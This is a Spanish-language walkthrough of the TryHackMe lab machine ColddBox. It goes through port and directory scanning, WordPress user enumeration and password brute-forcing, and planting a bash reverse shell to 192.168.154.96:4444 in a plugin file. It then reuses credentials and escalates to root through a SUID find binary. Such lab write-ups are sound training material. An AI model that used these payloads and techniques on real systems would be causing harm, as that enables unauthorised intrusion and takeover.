# ColddBox - TryHackMe

## Reconocimiento

Vamos a iniciar con un escaneo de puertos para identificar los servicios que están corriendo en la máquina objetivo.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.130.175.37 -Pn -oG allPorts

PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 62
4512/tcp open  unknown syn-ack ttl 62
```

Veamos los servicios que están corriendo en los puertos abiertos.

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que el puerto 80 está corriendo un servidor web Apache con WordPress 4.1.31, y el puerto 4512 está corriendo un servicio SSH.

Hagamos una enumeración de directorios en el servidor web para ver si encontramos algo interesante.

```bash
gobuster dir -u http://10.130.175.37 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 3727 -x txt,js,php,xml,bak --add-slash

/index.php/           (Status: 301) [Size: 0] [--> http://10.130.175.37/]
/icons/               (Status: 403) [Size: 278]
/.php/                (Status: 403) [Size: 278]
/wp-content/          (Status: 200) [Size: 0]
/wp-login.php/        (Status: 200) [Size: 2547]
/wp-includes/         (Status: 200) [Size: 26809]
/wp-trackback.php/    (Status: 200) [Size: 135]
/wp-admin/            (Status: 302) [Size: 0] [--> /wp-login.php?redirect_to=http%3A%2F%2F10.130.175.37%2Fwp-admin%2F&reauth=1]
/hidden/              (Status: 200) [Size: 340]
/xmlrpc.php/          (Status: 200) [Size: 42]
/wp-signup.php/       (Status: 302) [Size: 0] [--> /wp-login.php?action=register]
```

Nos metemos en el directorio `/hidden/` y encontramos el siguiente mensaje:

```

U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip

```

Un usuario llamado C0ldd cambió la contraseña de Hugo y Philip le está pidiendo que se la envíe para que pueda continuar subiendo sus artículos. De aquí sacamos 3 posibles usuarios: `C0ldd`, `Hugo` y `Philip`

Utilizamos wpscan para enumerar los usuarios y plugins de WordPress.

```bash
wpscan --url 'http://10.130.175.37' -e vp,u

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

## Explotación

Ahora podríamos intentar un ataque de fuerza bruta en el login de WordPress utilizando los usuarios que encontramos.

```bash
wpscan --url http://10.130.175.37 -U hugo -P /usr/share/wordlists/rockyou.txt

```

```bash
wpscan --url http://10.130.175.37 -U c0ldd -P /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

Nos loggeamos como `c0ldd` con la contraseña `9876543210` y vemos que podemos acceder al panel de administración de WordPress.

Nos metemos al editor de plugins y modificamos `akismet/akismet.php` para agregar una reverse shell.

```php
<?php
  system("bash -c 'bash -i >& /dev/tcp/192.168.154.96/4444 0>&1'")
?>
```

## Escalada de privilegios

Vamos a realizar un tratamiento de la tty

```bash
script /dev/null -c bash
CTRL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 cols 182
```

Hagamos comprobaciones:

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

sudo -l
[sudo] password for www-data: 

cat /etc/crontab
# Nada interesante

getcap -r 2>/dev/null
# Nada 

cat wp-config.php 

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Vamos a ver que puertos están escuchando en la máquina objetivo.

```bash
ss -tulnp

Netid  State      Recv-Q Send-Q                                           Local Address:Port                                                          Peer Address:Port              
udp    UNCONN     0      0                                                            *:68                                                                       *:*                  
tcp    LISTEN     0      128                                                          *:4512                                                                     *:*                  
tcp    LISTEN     0      128                                                  127.0.0.1:3306                                                                     *:*                  
tcp    LISTEN     0      128                                                         :::4512                                                                    :::*                  
tcp    LISTEN     0      128                                                         :::80                                                                      :::*

```

Efectivamente el puerto de MySQL está escuchando en el puerto 3306, pero solo en localhost.

```bash 
mysql -h localhost -u c0ldd -p
# Metemos la contraseña `cybersecurity` 

MariaDB [(none)]> 
```

Vemos que usa mariaDB

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| colddbox           |
| information_schema |
+--------------------+

MariaDB [(none)]> use coldbox
ERROR 1044 (42000): Access denied for user 'c0ldd'@'localhost' to database 'coldbox'
```

Vemos que el usuario `c0ldd` no tiene permisos para acceder a la base de datos `coldbox`.

Nos cambiamos al usuario `c0ldd` con la contraseña que encontramos en el login de mariaDB

```bash
su - c0ldd
cat user.txt
```

Vemos la primera flag.

```bash
find / -perm -4000 2>/dev/null

/usr/bin/find
```

Vamos a https://gtfobins.org/gtfobins/find/#shell

Y haremos esto:

```bash
find . -exec /bin/bash -p \; -quit

bash-4.3# whoami
root
```

Vamos al directorio /root y vemos la segunda flag.